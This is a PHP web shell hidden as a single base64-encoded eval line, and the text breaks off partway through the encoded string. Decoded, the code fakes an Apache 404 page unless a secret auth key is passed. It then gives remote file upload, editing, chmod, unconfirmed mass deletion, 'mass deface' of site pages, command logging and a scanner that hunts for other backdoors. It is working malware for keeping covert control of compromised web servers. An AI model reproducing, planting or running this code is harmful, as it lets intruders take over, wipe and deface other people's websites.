<?=eval("?>".base64_decode("PD9waHANCi8vID09PSBQRU5ZQU1BUkFOIEhFQURFUiAmIEFLU0VTIFRFUkxJTkRVTkcgPT09DQokc2VjcmV0X2F1dGggPSAna2F3YW5rdTIwMjUnOw0KaWYgKCFpc3NldCgkX0dFVFsnYXV0aCddKSB8fCAkX0dFVFsnYXV0aCddICE9PSAkc2VjcmV0X2F1dGgpIHsNCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdoZWFkZXJfcmVtb3ZlJykpIHsNCiAgICAgICAgQGhlYWRlcl9yZW1vdmUoJ1gtUG93ZXJlZC1CeScpOw0KICAgIH0NCiAgICBAaW5pX3NldCgnZXhwb3NlX3BocCcsIDApOw0KICAgIGh0dHBfcmVzcG9uc2VfY29kZSg0MDQpOw0KICAgIGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsNCiAgICBoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby1zdG9yZSwgbXVzdC1yZXZhbGlkYXRlJyk7DQogICAgaGVhZGVyKCdQcmFnbWE6IG5vLWNhY2hlJyk7DQogICAgaGVhZGVyKCdFeHBpcmVzOiAwJyk7DQogICAgZWNobyAnPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPg0KICAgIDxzdHlsZT5ib2R5e2ZvbnQtZmFtaWx5OnNhbnMtc2VyaWY7YmFja2dyb3VuZDojZmZmO2NvbG9yOiMzMzM7cGFkZGluZzo0MHB4O3RleHQtYWxpZ246Y2VudGVyO308L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQogICAgPGgxPjQwNCBOb3QgRm91bmQ8L2gxPg0KICAgIDxwPlRoZSByZXF1ZXN0ZWQgVVJMIHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPg0KICAgIDxocj4NCiAgICA8c21hbGw+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgJyAuICRfU0VSVkVSWyJIVFRQX0hPU1QiXSAuICcgUG9ydCA4MDwvc21hbGw+DQo8L2JvZHk+DQo8L2h0bWw+JzsNCiAgICBleGl0KCk7DQp9DQoNCi8vIFNpbXBhbiBhdXRoIHVudHVrIGRpcGFrYWkgZGkgc2VsdXJ1aCBoYWxhbWFuDQokYXV0aF9wYXJhbSA9ICc/YXV0aD0nIC4gdXJsZW5jb2RlKCRzZWNyZXRfYXV0aCk7DQokYXV0aF9hcHBlbmQgPSAnJmF1dGg9JyAuIHVybGVuY29kZSgkc2VjcmV0X2F1dGgpOw0KDQovLyBTaW1wbGUgV1NPKyBGaW5hbCBQbHVzIHY0IEZpbmFsIEVuaGFuY2VkIFZlcnNpb24NCi8vIENyZWF0ZSBCeSBUT01PREFDSEkgd2l0aCBBSQ0KDQplcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXRfdGltZV9saW1pdCgwKTsNCmluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDMwKTsNCg0KJGNvbG9yID0gIiMwMGZmOTkiOw0KJHVuYW1lID0gcGhwX3VuYW1lKCk7DQokcHdkID0gZ2V0Y3dkKCk7DQokbXNnID0gJyc7DQoNCnNlc3Npb25fc3RhcnQoKTsNCg0KLy8gPT09IEhJU1RPUlkgU1lTVEVNIChESVBFTFVFQVMgJiBTQU5HQVQgREVUQUlMKSA9PT0NCmlmICghaXNzZXQoJF9TRVNTSU9OWyd3c29faGlzdG9yeSddKSkgew0KICAgICRfU0VTU0lPTlsnd3NvX2hpc3RvcnknXSA9IFtdOw0KfQ0KZnVuY3Rpb24gYWRkVG9IaXN0b3J5KCRhY3Rpb24pIHsNCiAgICBnbG9iYWwgJHB3ZDsNCiAgICAkbG9nID0gIlsiIC4gZGF0ZSgnWS1tLWQgSDppOnMgVCcpIC4gIl0gIiAuICRhY3Rpb24gLiAiIHwgUGF0aDogIiAuICRwd2Q7DQogICAgJF9TRVNTSU9OWyd3c29faGlzdG9yeSddW10gPSAkbG9nOw0KICAgIGlmIChjb3VudCgkX1NFU1NJT05bJ3dzb19oaXN0b3J5J10pID4gMTAwKSB7DQogICAgICAgIGFycmF5X3NoaWZ0KCRfU0VTU0lPTlsnd3NvX2hpc3RvcnknXSk7DQogICAgfQ0KfQ0KDQovLyA9PT0gU0VTU0lPTiBGT1IgQ0xJUEJPQVJEID09PQ0KJGNsaXBib2FyZF9pbmZvID0gJyc7DQppZiAoIWVtcHR5KCRfU0VTU0lPTlsnY2xpcGJvYXJkJ10pKSB7DQogICAgJGNsaXBib2FyZF9pbmZvID0gY291bnQoJF9TRVNTSU9OWydjbGlwYm9hcmQnXSkgLiAiIGl0ZW0ocykgaW4gY2xpcGJvYXJkIjsNCiAgICB1bnNldCgkX1NFU1NJT05bJ2NsaXBib2FyZF9kaXNwbGF5ZWQnXSk7DQp9DQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnY2xpcGJvYXJkJ10pKSB7DQogICAgJF9TRVNTSU9OWydjbGlwYm9hcmQnXSA9IFtdOw0KfQ0KDQovLyA9PT0gQ1JFQVRFIEZJTEUgPT09DQppZiAoaXNzZXQoJF9QT1NUWydjcmVhdGVfZmlsZSddKSkgew0KICAgICRuYW1lID0gdHJpbSgkX1BPU1RbJ2ZpbGVuYW1lJ10pOw0KICAgIGlmICgkbmFtZSAmJiAhZmlsZV9leGlzdHMoJHB3ZCAuICcvJyAuICRuYW1lKSkgew0KICAgICAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJHB3ZCAuICcvJyAuICRuYW1lLCAnJykpIHsNCiAgICAgICAgICAgICRtc2cgPSAiRmlsZSBjcmVhdGVkOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkbmFtZSk7DQogICAgICAgICAgICBhZGRUb0hpc3RvcnkoIkNSRUFURUQgRklMRTogJyRuYW1lJyIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1zZyA9ICJGYWlsZWQgdG8gY3JlYXRlIGZpbGUuIjsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRtc2cgPSAiRmlsZSBhbHJlYWR5IGV4aXN0cyBvciBpbnZhbGlkIG5hbWUuIjsNCiAgICB9DQp9DQoNCi8vID09PSBDUkVBVEUgRk9MREVSID09PQ0KaWYgKGlzc2V0KCRfUE9TVFsnY3JlYXRlX2ZvbGRlciddKSkgew0KICAgICRuYW1lID0gdHJpbSgkX1BPU1RbJ2ZvbGRlcm5hbWUnXSk7DQogICAgaWYgKCRuYW1lICYmICFmaWxlX2V4aXN0cygkcHdkIC4gJy8nIC4gJG5hbWUpKSB7DQogICAgICAgIGlmIChta2RpcigkcHdkIC4gJy8nIC4gJG5hbWUsIDA3NTUsIHRydWUpKSB7DQogICAgICAgICAgICAkbXNnID0gIkZvbGRlciBjcmVhdGVkOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkbmFtZSk7DQogICAgICAgICAgICBhZGRUb0hpc3RvcnkoIkNSRUFURUQgRk9MREVSOiAnJG5hbWUnIik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbXNnID0gIkZhaWxlZCB0byBjcmVhdGUgZm9sZGVyLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbXNnID0gIkZvbGRlciBhbHJlYWR5IGV4aXN0cyBvciBpbnZhbGlkIG5hbWUuIjsNCiAgICB9DQp9DQoNCi8vID09PSBVUExPQUQgRklMRSA9PT0NCmlmIChpc3NldCgkX0ZJTEVTWyd1cGxvYWQnXSkpIHsNCiAgICAkZmlsZSA9ICRfRklMRVNbJ3VwbG9hZCddWyd0bXBfbmFtZSddOw0KICAgICRuYW1lID0gJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXTsNCiAgICAkdGFyZ2V0ID0gJHB3ZCAuICcvJyAuICRuYW1lOw0KICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGUsICR0YXJnZXQpKSB7DQogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcud3NvX3VwbG9hZF9sb2cnLCBkYXRlKCdZLW0tZCBIOmk6cycpIC4gIiB8ICRuYW1lXG4iLCBGSUxFX0FQUEVORCB8IExPQ0tfRVgpOw0KICAgICAgICAkbXNnID0gIlVwbG9hZGVkOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkbmFtZSkgLiAiICgiIC4gZGF0ZSgnWS1tLWQgSDppOnMnKSAuICIpIjsNCiAgICAgICAgYWRkVG9IaXN0b3J5KCJVUExPQURFRCBGSUxFOiAnJG5hbWUnIik7DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG1zZyA9ICJVcGxvYWQgZmFpbGVkISI7DQogICAgfQ0KfQ0KDQovLyA9PT0gU0FWRSBFRElURUQgRklMRSA9PT0NCmlmIChpc3NldCgkX1BPU1RbJ3NhdmUnXSkgJiYgaXNzZXQoJF9QT1NUWydmaWxlbmFtZSddKSkgew0KICAgICRmaWxlID0gJHB3ZCAuICcvJyAuICRfUE9TVFsnZmlsZW5hbWUnXTsNCiAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRfUE9TVFsnY29udGVudCddKSkgew0KICAgICAgICAkbXNnID0gIkZpbGUgc2F2ZWQ6ICIgLiBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRmaWxlKSk7DQogICAgICAgIGFkZFRvSGlzdG9yeSgiRURJVEVEIEZJTEU6ICciIC4gYmFzZW5hbWUoJGZpbGUpIC4gIiciKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkbXNnID0gIkZhaWxlZCB0byBzYXZlIGZpbGUuIjsNCiAgICB9DQp9DQoNCi8vID09PSBSRU5BTUUgPT09DQppZiAoaXNzZXQoJF9QT1NUWydkb19yZW5hbWUnXSkgJiYgaXNzZXQoJF9QT1NUWydvbGRuYW1lJ10pICYmIGlzc2V0KCRfUE9TVFsnbmV3bmFtZSddKSkgew0KICAgICRvbGQgPSAkcHdkIC4gJy8nIC4gJF9QT1NUWydvbGRuYW1lJ107DQogICAgJG5ldyA9ICRwd2QgLiAnLycgLiAkX1BPU1RbJ25ld25hbWUnXTsNCiAgICBpZiAoZmlsZV9leGlzdHMoJG9sZCkgJiYgIWZpbGVfZXhpc3RzKCRuZXcpKSB7DQogICAgICAgIGlmIChyZW5hbWUoJG9sZCwgJG5ldykpIHsNCiAgICAgICAgICAgICRtc2cgPSAiUmVuYW1lZDogIiAuIGh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydvbGRuYW1lJ10pIC4gIiB0byAiIC4gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ25ld25hbWUnXSk7DQogICAgICAgICAgICBhZGRUb0hpc3RvcnkoIlJFTkFNRUQ6ICckb2xkJyDihpIgJyRuZXcnIik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbXNnID0gIlJlbmFtZSBmYWlsZWQuIjsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRtc2cgPSAiUmVuYW1lIGVycm9yLiI7DQogICAgfQ0KfQ0KDQovLyA9PT0gQ0hNT0QgPT09DQppZiAoaXNzZXQoJF9QT1NUWydkb19jaG1vZCddKSkgew0KICAgIGlmIChpc3NldCgkX1BPU1RbJ2NobW9kX3RhcmdldCddKSkgew0KICAgICAgICAkdGFyZ2V0ID0gJHB3ZCAuICcvJyAuICRfUE9TVFsnY2htb2RfdGFyZ2V0J107DQogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnY2htb2RfcGF0aCddKSkgew0KICAgICAgICAkdGFyZ2V0ID0gJHB3ZDsNCiAgICB9DQogICAgJHBlcm1fdmFsID0gJF9QT1NUWydjaG1vZF92YWx1ZSddID8/ICcnOw0KICAgIGlmIChpc3NldCgkdGFyZ2V0KSAmJiBwcmVnX21hdGNoKCcvXlxkezMsNH0kLycsICRwZXJtX3ZhbCkpIHsNCiAgICAgICAgJHBlcm1fdmFsID0gbHRyaW0oJHBlcm1fdmFsLCAnMCcpOw0KICAgICAgICAkcGVybV92YWwgPSAnMCcgLiAkcGVybV92YWw7DQogICAgICAgICRwZXJtID0gb2N0ZGVjKCRwZXJtX3ZhbCk7DQogICAgICAgIGlmIChjaG1vZCgkdGFyZ2V0LCAkcGVybSkpIHsNCiAgICAgICAgICAgICRiYXNlbmFtZSA9IGJhc2VuYW1lKCR0YXJnZXQpID86ICJjdXJyZW50IGRpciI7DQogICAgICAgICAgICAkbXNnID0gIkNobW9kIHN1Y2Nlc3M6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRiYXNlbmFtZSkgLiAiIHRvICIgLiAkcGVybV92YWw7DQogICAgICAgICAgICBhZGRUb0hpc3RvcnkoIkNITU9EOiAnJGJhc2VuYW1lJyDihpIgJHBlcm1fdmFsIik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbXNnID0gIkNobW9kIGZhaWxlZC4iOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG1zZyA9ICJJbnZhbGlkIGNobW9kIGZvcm1hdC4iOw0KICAgIH0NCn0NCg0KLy8gPT09IE1BU1MgREVMRVRFICh0YW5wYSBrb25maXJtYXNpKSA9PT0NCmlmIChpc3NldCgkX1BPU1RbJ21hc3NfZGVsZXRlX2FjdGlvbiddKSAmJiAhZW1wdHkoJF9QT1NUWydzZWxlY3RlZCddKSkgew0KICAgICRzZWxlY3RlZCA9ICRfUE9TVFsnc2VsZWN0ZWQnXTsNCiAgICAkY291bnQgPSAwOw0KICAgICRkZWxldGVkID0gW107DQogICAgZm9yZWFjaCAoJHNlbGVjdGVkIGFzICRpdGVtKSB7DQogICAgICAgICRwYXRoID0gJHB3ZCAuICcvJyAuICRpdGVtOw0KICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRwYXRoKSkgY29udGludWU7DQogICAgICAgIGlmIChpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICAgICAkZmlsZXMgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcigNCiAgICAgICAgICAgICAgICBuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJHBhdGgsIFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yOjpTS0lQX0RPVFMpLA0KICAgICAgICAgICAgICAgIFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OkNISUxEX0ZJUlNUDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgJGZpbGUtPmlzRGlyKCkgPyBybWRpcigkZmlsZS0+Z2V0UmVhbFBhdGgoKSkgOiB1bmxpbmsoJGZpbGUtPmdldFJlYWxQYXRoKCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcm1kaXIoJHBhdGgpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdW5saW5rKCRwYXRoKTsNCiAgICAgICAgfQ0KICAgICAgICAkZGVsZXRlZFtdID0gJGl0ZW07DQogICAgICAgICRjb3VudCsrOw0KICAgIH0NCiAgICAkbXNnID0gIkRlbGV0ZWQgJGNvdW50IGl0ZW0ocykuIjsNCiAgICBhZGRUb0hpc3RvcnkoIk1BU1MgREVMRVRFRDogIiAuIGltcGxvZGUoJywgJywgJGRlbGV0ZWQpKTsNCiAgICBnb3RvIHNob3dfdWk7DQp9DQoNCi8vID09PSBNQVNTIE1PVkUgKHNlYmVsdW1ueWEgIlBhc3RlIikgPT09DQppZiAoaXNzZXQoJF9QT1NUWydtYXNzX2FjdGlvbiddKSAmJiAkX1BPU1RbJ21hc3NfYWN0aW9uJ10gPT09ICdtb3ZlJyAmJiAhZW1wdHkoJF9QT1NUWydzZWxlY3RlZCddKSkgew0KICAgICRzZWxlY3RlZCA9ICRfUE9TVFsnc2VsZWN0ZWQnXTsNCiAgICAkdGFyZ2V0X3BhdGggPSB0cmltKCRfUE9TVFsndGFyZ2V0X3BhdGgnXSA/PyAkcHdkKTsNCiAgICAkZHN0X2RpciA9IChzdWJzdHIoJHRhcmdldF9wYXRoLCAwLCAxKSA9PT0gJy8nKSA/ICR0YXJnZXRfcGF0aCA6IGdldGN3ZCgpIC4gJy8nIC4gJHRhcmdldF9wYXRoOw0KICAgIGlmICghaXNfZGlyKCRkc3RfZGlyKSkgew0KICAgICAgICBAbWtkaXIoJGRzdF9kaXIsIDA3NTUsIHRydWUpOw0KICAgIH0NCiAgICBpZiAoIWlzX2RpcigkZHN0X2RpcikpIHsNCiAgICAgICAgJG1zZyA9ICJUYXJnZXQgcGF0aCBpcyBpbnZhbGlkIGFuZCBjYW5ub3QgYmUgY3JlYXRlZC4iOw0KICAgICAgICBnb3RvIHNob3dfdWk7DQogICAgfQ0KDQogICAgJGNvdW50ID0gMDsNCiAgICBmb3JlYWNoICgkc2VsZWN0ZWQgYXMgJGl0ZW0pIHsNCiAgICAgICAgJHNyYyA9ICRwd2QgLiAnLycgLiAkaXRlbTsNCiAgICAgICAgaWYgKCFmaWxlX2V4aXN0cygkc3JjKSkgY29udGludWU7DQogICAgICAgICRkc3QgPSAkZHN0X2RpciAuICcvJyAuICRpdGVtOw0KICAgICAgICBpZiAocmVuYW1lKCRzcmMsICRkc3QpKSB7DQogICAgICAgICAgICAkY291bnQrKzsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkbXNnID0gIk1vdmVkICRjb3VudCBpdGVtKHMpIHRvOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkZHN0X2Rpcik7DQogICAgYWRkVG9IaXN0b3J5KCJNQVNTIE1PVkVEICRjb3VudCBpdGVtcyB0bzogJGRzdF9kaXIiKTsNCiAgICBnb3RvIHNob3dfdWk7DQp9DQoNCi8vID09PSBNQVNTIEFDVElPTlMgKENPUFkgb25seSkgPT09DQppZiAoaXNzZXQoJF9QT1NUWydtYXNzX2FjdGlvbiddKSAmJiAkX1BPU1RbJ21hc3NfYWN0aW9uJ10gPT09ICdjb3B5JyAmJiAhZW1wdHkoJF9QT1NUWydzZWxlY3RlZCddKSkgew0KICAgICRzZWxlY3RlZCA9ICRfUE9TVFsnc2VsZWN0ZWQnXTsNCiAgICAkdGFyZ2V0X3BhdGggPSB0cmltKCRfUE9TVFsndGFyZ2V0X3BhdGgnXSA/PyAkcHdkKTsNCiAgICAkZHN0X2RpciA9IChzdWJzdHIoJHRhcmdldF9wYXRoLCAwLCAxKSA9PT0gJy8nKSA/ICR0YXJnZXRfcGF0aCA6IGdldGN3ZCgpIC4gJy8nIC4gJHRhcmdldF9wYXRoOw0KICAgIGlmICghaXNfZGlyKCRkc3RfZGlyKSkgew0KICAgICAgICBAbWtkaXIoJGRzdF9kaXIsIDA3NTUsIHRydWUpOw0KICAgIH0NCiAgICBpZiAoIWlzX2RpcigkZHN0X2RpcikpIHsNCiAgICAgICAgJG1zZyA9ICJUYXJnZXQgcGF0aCBpcyBpbnZhbGlkIGFuZCBjYW5ub3QgYmUgY3JlYXRlZC4iOw0KICAgICAgICBnb3RvIHNob3dfdWk7DQogICAgfQ0KDQogICAgJGNvdW50ID0gMDsNCiAgICBmb3JlYWNoICgkc2VsZWN0ZWQgYXMgJGl0ZW0pIHsNCiAgICAgICAgJHNyYyA9ICRwd2QgLiAnLycgLiAkaXRlbTsNCiAgICAgICAgaWYgKCFmaWxlX2V4aXN0cygkc3JjKSkgY29udGludWU7DQoNCiAgICAgICAgJGRzdCA9ICRkc3RfZGlyIC4gJy8nIC4gJGl0ZW07DQogICAgICAgICRpID0gMTsNCiAgICAgICAgd2hpbGUgKGZpbGVfZXhpc3RzKCRkc3QpKSB7DQogICAgICAgICAgICAkZXh0ID0gcGF0aGluZm8oJGl0ZW0sIFBBVEhJTkZPX0VYVEVOU0lPTik7DQogICAgICAgICAgICAkbmFtZSA9IHBhdGhpbmZvKCRpdGVtLCBQQVRISU5GT19GSUxFTkFNRSk7DQogICAgICAgICAgICAkbmV3X25hbWUgPSAkbmFtZSAuICJfY29weV8kaSIgLiAoJGV4dCA/ICIuJGV4dCIgOiAiIik7DQogICAgICAgICAgICAkZHN0ID0gJGRzdF9kaXIgLiAnLycgLiAkbmV3X25hbWU7DQogICAgICAgICAgICAkaSsrOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc19maWxlKCRzcmMpKSB7DQogICAgICAgICAgICBjb3B5KCRzcmMsICRkc3QpOw0KICAgICAgICAgICAgJF9TRVNTSU9OWydjbGlwYm9hcmQnXVtdID0gWyduYW1lJyA9PiBiYXNlbmFtZSgkZHN0KSwgJ3BhdGgnID0+ICRkc3RfZGlyXTsNCiAgICAgICAgfSBlbHNlaWYgKGlzX2Rpcigkc3JjKSkgew0KICAgICAgICAgICAgbWtkaXIoJGRzdCwgMDc1NSwgdHJ1ZSk7DQogICAgICAgICAgICAkX1NFU1NJT05bJ2NsaXBib2FyZCddW10gPSBbJ25hbWUnID0+IGJhc2VuYW1lKCRkc3QpLCAncGF0aCcgPT4gJGRzdF9kaXJdOw0KICAgICAgICB9DQogICAgICAgICRjb3VudCsrOw0KICAgIH0NCiAgICAkbXNnID0gIkNvcGllZCAkY291bnQgaXRlbShzKSB0bzogIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGRzdF9kaXIpOw0KICAgIGFkZFRvSGlzdG9yeSgiTUFTUyBDT1BJRUQgJGNvdW50IGl0ZW1zIHRvOiAkZHN0X2RpciIpOw0KfQ0KDQovLyA9PT0gTUFTUyBERUZBQ0UgPT09DQppZiAoaXNzZXQoJF9QT1NUWydtYXNzX2RlZmFjZSddKSkgew0KICAgICRmaWxlbmFtZSA9IHRyaW0oJF9QT1NUWydkZWZhY2VfZmlsZW5hbWUnXSk7DQogICAgJGNvbnRlbnQgPSAkX1BPU1RbJ2RlZmFjZV9jb250ZW50J107DQogICAgJHRhcmdldF9kaXIgPSB0cmltKCRfUE9TVFsnZGVmYWNlX3BhdGgnXSk7DQogICAgaWYgKCEkZmlsZW5hbWUgfHwgISRjb250ZW50IHx8ICEkdGFyZ2V0X2Rpcikgew0KICAgICAgICAkbXNnID0gIkFsbCBmaWVsZHMgYXJlIHJlcXVpcmVkLiI7DQogICAgICAgIGdvdG8gc2hvd191aTsNCiAgICB9DQoNCiAgICAkZnVsbF9kaXIgPSAoc3Vic3RyKCR0YXJnZXRfZGlyLCAwLCAxKSA9PT0gJy8nKSA/ICR0YXJnZXRfZGlyIDogZ2V0Y3dkKCkgLiAnLycgLiAkdGFyZ2V0X2RpcjsNCiAgICBpZiAoIWlzX2RpcigkZnVsbF9kaXIpKSB7DQogICAgICAgIEBta2RpcigkZnVsbF9kaXIsIDA3NTUsIHRydWUpOw0KICAgIH0NCiAgICBpZiAoaXNfZGlyKCRmdWxsX2RpcikpIHsNCiAgICAgICAgJGZpbGVfcGF0aCA9ICRmdWxsX2RpciAuICcvJyAuICRmaWxlbmFtZTsNCiAgICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlX3BhdGgsICRjb250ZW50KSkgew0KICAgICAgICAgICAgJG1zZyA9ICJEZWZhY2UgZmlsZSAnJGZpbGVuYW1lJyBjcmVhdGVkIGluOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkZnVsbF9kaXIpOw0KICAgICAgICAgICAgYWRkVG9IaXN0b3J5KCJNQVNTIERFRkFDRTogQ3JlYXRlZCAnJGZpbGVuYW1lJyBpbiAkZnVsbF9kaXIiKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtc2cgPSAiRmFpbGVkIHRvIHdyaXRlIGRlZmFjZSBmaWxlLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbXNnID0gIkNhbm5vdCBjcmVhdGUgb3IgYWNjZXNzIHRhcmdldCBkaXJlY3RvcnkuIjsNCiAgICB9DQp9DQoNCi8vID09PSBDT01NQU5EIEVYRUNVVElPTiBMT0cgPT09DQppZiAoJF9QT1NUICYmICFlbXB0eSgkX1BPU1RbJ2NtZCddKSkgew0KICAgIGFkZFRvSGlzdG9yeSgiRVhFQ1VURUQgQ09NTUFORDogJyIgLiBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnY21kJ10pIC4gIiciKTsNCn0NCg0KLy8gPT09IEJBQ0tET09SIFNDQU5ORVIgTE9HID09PQ0KaWYgKGlzc2V0KCRfUE9TVFsncnVuX3NjYW4nXSkpIHsNCiAgICAkc2Nhbl9wYXRoID0gJF9QT1NUWydzY2FuX3BhdGgnXSA/PyAkcHdkOw0KICAgIGFkZFRvSGlzdG9yeSgiUkFOIEJBQ0tET09SIFNDQU5ORVIgb246ICRzY2FuX3BhdGgiKTsNCn0NCg0KLy8gPT09IFBBVEggTkFWSUdBVElPTiBMT0cgPT09DQppZiAoaXNzZXQoJF9HRVRbJ3BhdGgnXSkpIHsNCiAgICBhZGRUb0hpc3RvcnkoIk5BVklHQVRFRCBUTyBQQVRIOiAiIC4gJF9HRVRbJ3BhdGgnXSk7DQp9DQoNCi8vID09PSBFTkhBTkNFRCBCQUNLRE9PUiBTQ0FOTkVSID09PQ0KJHNjYW5fcmVzdWx0cyA9IFtdOw0KaWYgKGlzc2V0KCRfUE9TVFsncnVuX3NjYW4nXSkpIHsNCiAgICAkc2Nhbl9wYXRoID0gJF9QT1NUWydzY2FuX3BhdGgnXSA/PyAkcHdkOw0KICAgICRzY2FuX3BhdGggPSByZWFscGF0aCgkc2Nhbl9wYXRoKTsNCiAgICBpZiAoISRzY2FuX3BhdGggfHwgIWlzX2Rpcigkc2Nhbl9wYXRoKSkgew0KICAgICAgICAkc2Nhbl9wYXRoID0gJHB3ZDsNCiAgICB9DQoNCiAgICAkcGF0dGVybnMgPSBbDQogICAgICAgICdldmFsJyA9PiAnL2V2YWxccypcKFteKV0qXCkvaScsDQogICAgICAgICdiYXNlNjRfZGVjb2RlJyA9PiAnL2Jhc2U2NF9kZWNvZGVccypcKFteKV0qXCkvaScsDQogICAgICAgICdzaGVsbF9leGVjJyA9PiAnL3NoZWxsX2V4ZWNccypcKFteKV0qXCkvaScsDQogICAgICAgICdwYXNzdGhydScgPT4gJy9wYXNzdGhydVxzKlwoW14pXSpcKS9pJywNCiAgICAgICAgJ2V4ZWMnID0+ICcvZXhlY1xzKlwoW14pXSpcKS9pJywNCiAgICAgICAgJ3N5c3RlbScgPT4gJy9zeXN0ZW1ccypcKFteKV0qXCkvaScsDQogICAgICAgICdwb3BlbicgPT4gJy9wb3BlblxzKlwoW14pXSpcKS9pJywNCiAgICAgICAgJ3Byb2Nfb3BlbicgPT4gJy9wcm9jX29wZW5ccypcKFteKV0qXCkvaScsDQogICAgICAgICdhc3NlcnQnID0+ICcvYXNzZXJ0XHMqXChbXildKlwpL2knLA0KICAgICAgICAncHJlZ19yZXBsYWNlIC9lJyA9PiAnL3ByZWdfcmVwbGFjZVxzKlwoW14pXSpcL2VbXildKlwpL2knLA0KICAgICAgICAnZmlsZV9wdXRfY29udGVudHMnID0+ICcvZmlsZV9wdXRfY29udGVudHNccypcKFteKV0qXCkvaScsDQogICAgICAgICdtb3ZlX3VwbG9hZGVkX2ZpbGUnID0+ICcvbW92ZV91cGxvYWRlZF9maWxlXHMqXChbXildKlwpL2knLA0KICAgICAgICAnb2JmdXNjYXRlZCBldmFsJyA9PiAnL2V2YWxccypcKFxzKmJhc2U2NF9kZWNvZGVccypcKFteKV0qXClccypcKS9pJywNCiAgICAgICAgJ2d6aW5mbGF0ZScgPT4gJy9nemluZmxhdGVccypcKFteKV0qXCkvaScsDQogICAgICAgICdiYWNrdGljaycgPT4gJy9gW15gXSpgLycsDQogICAgICAgICdjaG1vZCBsaXRlcmFsJyA9PiAnL2NobW9kXHMrWzAtN117Myw0fS8nLA0KICAgICAgICAnX19oYWx0X2NvbXBpbGVyJyA9PiAnL19faGFsdF9jb21waWxlcig/IVtBLVphLXowLTlfXSkvaScsDQogICAgXTsNCg0KICAgICRzY2FuX2xpbWl0ID0gNTAwMDA7DQogICAgJHNjYW5uZWQgPSAwOw0KICAgICRpdGVyYXRvciA9IG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKA0KICAgICAgICBuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJHNjYW5fcGF0aCwgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3I6OlNLSVBfRE9UUyksDQogICAgICAgIFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OlNFTEZfRklSU1QNCiAgICApOw0KDQogICAgZm9yZWFjaCAoJGl0ZXJhdG9yIGFzICRmaWxlKSB7DQogICAgICAgIGlmICgrKyRzY2FubmVkID4gJHNjYW5fbGltaXQpIGJyZWFrOw0KICAgICAgICBpZiAoISRmaWxlLT5pc0ZpbGUoKSkgY29udGludWU7DQogICAgICAgIGlmICgkZmlsZS0+Z2V0U2l6ZSgpID4gNTAwMDAgKiAxMDI0KSBjb250aW51ZTsNCiAgICAgICAgaWYgKCFpc19yZWFkYWJsZSgkZmlsZS0+Z2V0UGF0aG5hbWUoKSkpIGNvbnRpbnVlOw0KDQogICAgICAgICRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlLT5nZXRQYXRobmFtZSgpKTsNCiAgICAgICAgaWYgKCRjb250ZW50ID09PSBmY